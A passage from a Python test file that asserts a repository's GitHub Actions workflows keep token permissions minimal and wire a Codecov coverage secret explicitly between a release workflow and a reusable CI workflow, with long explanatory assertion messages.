        f"{dict(alerts_granted)!r}, expected exactly "
        f"{EXACT_ALERT_JOB_PERMISSIONS!r}. That job runs on "
        "`pull_request_target` and `workflow_run` with a write token, and it "
        "paginates every open unassigned alert in the repository, so a scope "
        "beyond the one the alerts API requires is a wider token around a "
        "loop that touches a variable number of findings"
    )

    zizmor_path = repo_root / WORKFLOWS_DIR / ZIZMOR_WORKFLOW_FILE
    assert zizmor_path.is_file(), f"required gating file is missing: {zizmor_path}"
    zizmor_jobs = _workflow_jobs(_load_workflow(zizmor_path), zizmor_path)
    assert zizmor_jobs, (
        f"{ZIZMOR_WORKFLOW_FILE} declares no jobs, so the assertion below would "
        "pass by inspecting an empty mapping rather than by finding the scope it "
        "is looking for"
    )
    zizmor_writers = _scope_writers(zizmor_jobs, CONTENTS_SCOPE)
    assert not zizmor_writers, (
        f"these {ZIZMOR_WORKFLOW_FILE} jobs hold {CONTENTS_SCOPE}: "
        f"{PERMISSION_WRITE}: {dict(zizmor_writers)!r}. That workflow's deny-all "
        "`permissions: {}` is the reason a job cannot inherit write access it "
        "did not ask for, and a grant inside it undoes the convention for every "
        "job in the file rather than just its own"
    )


def test_release_pipeline_threads_the_coverage_secret_into_reusable_ci(
    repo_root: Path,
) -> None:
    """Assert the reusable CI call and its callee agree on ``CODECOV_TOKEN``.

    A reusable workflow does not inherit the caller's secrets implicitly: the
    callee sees only the secrets its own ``workflow_call`` declares, and only
    those the caller names. So the secret has to be declared on *both* ends of
    the call, and actionlint rejects a caller passing a secret the callee never
    declares -- which means the two halves cannot drift apart without a red
    build, and cannot be silently half-wired either.

    What the current wiring protects is a coupling nobody can see. Inside
    ``ci.yml`` the coverage upload is gated on ``IS_COVERAGE_RUN``, which also
    requires a push to ``refs/heads/main``; a release build runs on a tag, so
    the upload step never fires there and the empty secret is currently
    harmless. That is a four-way coupling between two files and a tag name,
    and it survives only because no run takes the branch where the two
    conditions both hold. Change either condition -- allow coverage on any
    caller, or make a release build resolve the default branch -- and the
    release goes red on a missing token, in the pipeline that can least afford
    an unexplained failure. Asserting the wiring makes the coupling explicit
    instead of load-bearing.

    Args:
        repo_root: The repository root, used to locate ``cd.yml`` and ``ci.yml``.
    """
    cd_path, cd_data = _cd_workflow(repo_root)
    caller = _require_job(cd_data, cd_path, CI_JOB)
    passed = caller.get(SECRETS_KEY)
    assert isinstance(passed, dict), (
        f"the {CI_JOB!r} job in {cd_path.name} calls {CI_REUSABLE_WORKFLOW!r} "
        f"with `{SECRETS_KEY}: {passed!r}` ({type(passed).__name__}), expected a "
        f"mapping naming {CODECOV_CREDENTIAL_NAME!r}. A reusable workflow does "
        "not inherit the caller's secrets implicitly, so without this mapping "
        f"`secrets.{CODECOV_CREDENTIAL_NAME}` is empty inside the callee. Today "
        "that is invisible, because the coverage upload also requires a push to "
        "refs/heads/main and a release runs on a tag -- a four-way coupling "
        "across two files that any change to either condition turns into a red "
        "release build. (`secrets: inherit` is refused for the same reason it "
        "would be a poor answer here: it hands the callee every secret in the "
        "repository rather than the one the callee declares)"
    )
    assert CODECOV_CREDENTIAL_NAME in passed, (
        f"the {CI_JOB!r} job in {cd_path.name} passes {dict(passed)!r}, which "
        f"omits {CODECOV_CREDENTIAL_NAME!r}. That is the secret ci.yml's coverage "
        "upload reads, and the callee cannot see one the caller did not name"
    )

    ci_path = repo_root / WORKFLOWS_DIR / CI_WORKFLOW_FILE
    assert ci_path.is_file(), f"required gating file is missing: {ci_path}"
    call = _trigger_block(_load_workflow(ci_path), WORKFLOW_CALL_TRIGGER)
    assert isinstance(call, dict), (
        f"{ci_path.name} declares `{WORKFLOW_CALL_TRIGGER}: {call!r}` "
        f"({type(call).__name__}), expected a mapping declaring the inputs and "
        "secrets a caller may pass. Without that block the workflow cannot be "
        f"called at all, and {cd_path.name}'s release gate is calling it"
    )
    declared = call.get(SECRETS_KEY)
    assert isinstance(declared, dict), (
        f"{ci_path.name} declares `{WORKFLOW_CALL_TRIGGER}.{SECRETS_KEY}: "
        f"{declared!r}` ({type(declared).__name__}), expected a mapping naming "
        f"{CODECOV_CREDENTIAL_NAME!r}. The callee can only be handed a secret it "
        "declares, so this block is what makes the release's coverage token "
        "reachable at all"
    )
    assert declared.get(CODECOV_CREDENTIAL_NAME) is not None, (
        f"{ci_path.name} declares `{WORKFLOW_CALL_TRIGGER}.{SECRETS_KEY}:` as "
        f"{dict(declared)!r}, which omits {CODECOV_CREDENTIAL_NAME!r}. The "
        "coverage upload step reads that exact name, so a caller that does pass "
        "it would still see an empty value, and the upload would fail closed on "
        "`fail_ci_if_error` with nothing to authenticate with. actionlint rejects "
        "a caller passing a secret the callee never declares, so both halves of "
        "this contract are enforced by the linter as well; the assertion is here "
        "so the reason survives the linter's wording"
    )
